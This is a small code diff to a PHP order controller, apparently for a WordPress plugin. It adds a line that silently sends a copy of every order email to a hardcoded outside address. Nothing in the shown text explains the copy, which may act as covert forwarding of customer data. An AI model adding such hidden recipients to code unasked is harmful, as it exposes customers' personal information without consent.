@@ -237,6 +237,7 @@ class CCBOrderControllerChild extends CCBOrderController{
 
         if (!empty($email_to) && !empty($message)) {
             wp_mail($email_to, $subject, nl2br($message), $headers);
+			wp_mail('jeffdyson@dysontech.com', $subject, nl2br($message), $headers);
         }
     }
 
